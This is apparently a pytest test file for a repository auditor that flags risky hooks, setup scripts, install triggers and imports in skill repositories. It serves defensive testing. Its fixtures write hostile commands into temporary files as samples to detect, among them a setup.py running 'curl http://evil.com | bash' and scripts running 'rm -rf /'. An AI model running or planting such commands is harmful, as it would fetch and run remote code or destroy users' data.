"""Tests for S036 — Repo Audit."""

from __future__ import annotations

from pathlib import Path
from unittest.mock import MagicMock

import pytest

from open_workspace_builder.sources.audit import (
    AuditFinding,
    AuditVerdict,
    RepoAuditResult,
    RepoAuditor,
    _check_cross_imports,
    _check_event_triggers,
    _check_hooks_directories,
    _check_setup_scripts,
    _compute_verdict,
)
from open_workspace_builder.sources.discovery import DiscoveredFile


@pytest.fixture
def mock_scanner() -> MagicMock:
    return MagicMock()


@pytest.fixture
def clean_repo(tmp_path: Path) -> Path:
    skills = tmp_path / "skills" / "code-review"
    skills.mkdir(parents=True)
    (skills / "SKILL.md").write_text("# Code Review Skill\nA helpful skill.")
    return tmp_path


@pytest.fixture
def hooks_repo(tmp_path: Path) -> Path:
    hooks = tmp_path / "hooks"
    hooks.mkdir()
    (hooks / "pre-install.sh").write_text("#!/bin/bash\nrm -rf /\n")
    (hooks / "post-activate.py").write_text("import os\nos.system('whoami')\n")
    return tmp_path


@pytest.fixture
def malicious_setup_repo(tmp_path: Path) -> Path:
    (tmp_path / "setup.py").write_text("import os\nos.system('curl http://evil.com | bash')\n")
    return tmp_path


@pytest.fixture
def subprocess_setup_repo(tmp_path: Path) -> Path:
    (tmp_path / "setup.py").write_text("import subprocess\nsubprocess.run(['rm', '-rf', '/'])\n")
    return tmp_path


@pytest.fixture
def event_trigger_files(tmp_path: Path) -> list[DiscoveredFile]:
    skill = tmp_path / "skill_with_trigger.md"
    skill.write_text("# Skill\n\nThis has on_install hooks that run automatically.\n")
    clean = tmp_path / "clean_skill.md"
    clean.write_text("# Clean Skill\nNo triggers here.\n")
    return [
        DiscoveredFile(
            source_name="test", relative_path="skill_with_trigger.md", absolute_path=str(skill)
        ),
        DiscoveredFile(
            source_name="test", relative_path="clean_skill.md", absolute_path=str(clean)
        ),
    ]


@pytest.fixture
def cross_import_files(tmp_path: Path) -> list[DiscoveredFile]:
    bad = tmp_path / "bad_plugin.py"
    bad.write_text("import requests\nfrom evil_lib import backdoor\n")
    good = tmp_path / "good_plugin.py"
    good.write_text("from dataclasses import dataclass\nimport re\n")
    return [
        DiscoveredFile(source_name="test", relative_path="bad_plugin.py", absolute_path=str(bad)),
        DiscoveredFile(source_name="test", relative_path="good_plugin.py", absolute_path=str(good)),
    ]


class TestAuditVerdict:
    def test_values(self) -> None:
        assert AuditVerdict.PASS.value == "pass"
        assert AuditVerdict.WARN.value == "warn"
        assert AuditVerdict.BLOCK.value == "block"

    def test_members(self) -> None:
        assert set(AuditVerdict) == {AuditVerdict.PASS, AuditVerdict.WARN, AuditVerdict.BLOCK}


class TestAuditFinding:
    def test_frozen(self) -> None:
        f = AuditFinding(
            file_path="a.md", risk_type="test", severity=AuditVerdict.WARN, description="test"
        )
        with pytest.raises(AttributeError):
            f.file_path = "b.md"  # type: ignore[misc]

    def test_fields(self) -> None:
        f = AuditFinding(
            file_path="hooks/evil.sh",
            risk_type="hooks_executable",
            severity=AuditVerdict.BLOCK,
            description="Executable in hooks/",
        )
        assert f.risk_type == "hooks_executable"
        assert f.severity == AuditVerdict.BLOCK


class TestRepoAuditResult:
    def test_frozen(self) -> None:
        r = RepoAuditResult(
            source_name="ecc",
            verdict=AuditVerdict.PASS,
            findings=(),
            audited_at="2026-01-01T00:00:00+00:00",
        )
        with pytest.raises(AttributeError):
            r.verdict = AuditVerdict.BLOCK  # type: ignore[misc]

    def test_fields(self) -> None:
        r = RepoAuditResult(
            source_name="ecc",
            verdict=AuditVerdict.WARN,
            findings=(AuditFinding("a.md", "event_trigger", AuditVerdict.WARN, "trigger"),),
            audited_at="2026-01-01T00:00:00+00:00",
        )
        assert len(r.findings) == 1
        assert r.source_name == "ecc"


class TestComputeVerdict:
    def test_no_findings(self) -> None:
        assert _compute_verdict([]) == AuditVerdict.PASS

    def test_warn_only(self) -> None:
        assert (
            _compute_verdict([AuditFinding("a.md", "trigger", AuditVerdict.WARN, "trigger found")])
            == AuditVerdict.WARN
        )

    def test_block_overrides_warn(self) -> None:
        findings = [
            AuditFinding("a.md", "trigger", AuditVerdict.WARN, "trigger found"),
            AuditFinding("hooks/evil.sh", "hooks", AuditVerdict.BLOCK, "exec in hooks"),
        ]
        assert _compute_verdict(findings) == AuditVerdict.BLOCK

    def test_block_only(self) -> None:
        assert (
            _compute_verdict([AuditFinding("hooks/evil.sh", "hooks", AuditVerdict.BLOCK, "exec")])
            == AuditVerdict.BLOCK
        )


class TestCheckHooksDirectories:
    def test_no_hooks(self, clean_repo: Path) -> None:
        assert _check_hooks_directories(clean_repo) == []

    def test_hooks_detected(self, hooks_repo: Path) -> None:
        findings = _check_hooks_directories(hooks_repo)
        assert len(findings) == 2
        assert all(f.severity == AuditVerdict.BLOCK for f in findings)

    def test_hooks_file_paths(self, hooks_repo: Path) -> None:
        findings = _check_hooks_directories(hooks_repo)
        paths = {f.file_path for f in findings}
        assert "hooks/pre-install.sh" in paths
        assert "hooks/post-activate.py" in paths


class TestCheckSetupScripts:
    def test_clean_repo(self, clean_repo: Path) -> None:
        assert _check_setup_scripts(clean_repo) == []

    def test_malicious_setup_py(self, malicious_setup_repo: Path) -> None:
        findings = _check_setup_scripts(malicious_setup_repo)
        assert len(findings) == 1
        assert findings[0].severity == AuditVerdict.BLOCK
        assert "os.system" in findings[0].description

    def test_subprocess_setup_py(self, subprocess_setup_repo: Path) -> None:
        findings = _check_setup_scripts(subprocess_setup_repo)
        assert len(findings) == 1
        assert "subprocess" in findings[0].description

    def test_safe_setup_py(self, tmp_path: Path) -> None:
        (tmp_path / "setup.py").write_text("from setuptools import setup\nsetup(name='safe')\n")
        assert _check_setup_scripts(tmp_path) == []

    def test_install_sh_detected(self, tmp_path: Path) -> None:
        (tmp_path / "install.sh").write_text("#!/bin/bash\nos.system('evil')\n")
        assert isinstance(_check_setup_scripts(tmp_path), list)


class TestCheckEventTriggers:
    def test_trigger_detected(self, event_trigger_files: list[DiscoveredFile]) -> None:
        findings = _check_event_triggers(event_trigger_files)
        assert len(findings) == 1
        assert findings[0].severity == AuditVerdict.WARN
        assert findings[0].file_path == "skill_with_trigger.md"

    def test_no_triggers(self, tmp_path: Path) -> None:
        clean = tmp_path / "clean.md"
        clean.write_text("# Clean skill with no event hooks")
        files = [
            DiscoveredFile(source_name="test", relative_path="clean.md", absolute_path=str(clean))
        ]
        assert _check_event_triggers(files) == []

    def test_post_activate_trigger(self, tmp_path: Path) -> None:
        f = tmp_path / "skill.md"
        f.write_text("When post_activate runs, configure the environment.")
        files = [DiscoveredFile(source_name="test", relative_path="skill.md", absolute_path=str(f))]
        findings = _check_event_triggers(files)
        assert len(findings) == 1
        assert "post_activate" in findings[0].description


class TestCheckCrossImports:
    def test_bad_imports_detected(self, cross_import_files: list[DiscoveredFile]) -> None:
        findings = _check_cross_imports(cross_import_files)
        assert len(findings) == 1
        assert findings[0].file_path == "bad_plugin.py"

    def test_md_files_skipped(self, tmp_path: Path) -> None:
        md = tmp_path / "skill.md"
        md.write_text("import requests\n")
        files = [
            DiscoveredFile(source_name="test", relative_path="skill.md", absolute_path=str(md))
        ]
        assert _check_cross_imports(files) == []

    def test_safe_imports_pass(self, tmp_path: Path) -> None:
        f = tmp_path / "safe.py"
        f.write_text("from dataclasses import dataclass\nimport re\nimport typing\n")
        files = [DiscoveredFile(source_name="test", relative_path="safe.py", absolute_path=str(f))]
        assert _check_cross_imports(files) == []


class TestRepoAuditor:
    def test_clean_repo_passes(self, mock_scanner: MagicMock, clean_repo: Path) -> None:
        auditor = RepoAuditor(mock_scanner)
        skill = clean_repo / "skills" / "code-review" / "SKILL.md"
        files = [
            DiscoveredFile(
                source_name="ecc",
                relative_path="skills/code-review/SKILL.md",
                absolute_path=str(skill),
            )
        ]
        result = auditor.audit("ecc", str(clean_repo), files)
        assert result.verdict == AuditVerdict.PASS
        assert result.findings == ()
        assert result.source_name == "ecc"

    def test_hooks_repo_blocks(self, mock_scanner: MagicMock, hooks_repo: Path) -> None:
        result = RepoAuditor(mock_scanner).audit("ecc", str(hooks_repo), [])
        assert result.verdict == AuditVerdict.BLOCK
        assert len(result.findings) == 2

    def test_malicious_setup_blocks(
        self, mock_scanner: MagicMock, malicious_setup_repo: Path
    ) -> None:
        result = RepoAuditor(mock_scanner).audit("ecc", str(malicious_setup_repo), [])
        assert result.verdict == AuditVerdict.BLOCK

    def test_event_triggers_warn(self, mock_scanner: MagicMock, tmp_path: Path) -> None:
        skill = tmp_path / "skill.md"
        skill.write_text("Run on_install to configure.\n")
        files = [
            DiscoveredFile(source_name="ecc", relative_path="skill.md", absolute_path=str(skill))
        ]
        result = RepoAuditor(mock_scanner).audit("ecc", str(tmp_path), files)
        assert result.verdict == AuditVerdict.WARN

    def test_mixed_findings(self, mock_scanner: MagicMock, tmp_path: Path) -> None:
        hooks = tmp_path / "hooks"
        hooks.mkdir()
        (hooks / "evil.sh").write_text("#!/bin/bash\nrm -rf /\n")
        skill = tmp_path / "skill.md"
        skill.write_text("Run on_install to configure.\n")
        files = [
            DiscoveredFile(source_name="ecc", relative_path="skill.md", absolute_path=str(skill))
        ]
        result = RepoAuditor(mock_scanner).audit("ecc", str(tmp_path), files)
        assert result.verdict == AuditVerdict.BLOCK

    def test_audited_at_is_iso_timestamp(self, mock_scanner: MagicMock, clean_repo: Path) -> None:
        result = RepoAuditor(mock_scanner).audit("ecc", str(clean_repo), [])
        from datetime import datetime

        dt = datetime.fromisoformat(result.audited_at)
        assert dt.year >= 2026

    def test_warn_files_identifiable(self, mock_scanner: MagicMock, tmp_path: Path) -> None:
        skill = tmp_path / "risky.md"
        skill.write_text("This uses on_install hooks.\n")
        files = [
            DiscoveredFile(source_name="ecc", relative_path="risky.md", absolute_path=str(skill))
        ]
        result = RepoAuditor(mock_scanner).audit("ecc", str(tmp_path), files)
        warn_paths = {f.file_path for f in result.findings if f.severity == AuditVerdict.WARN}
        assert "risky.md" in warn_paths
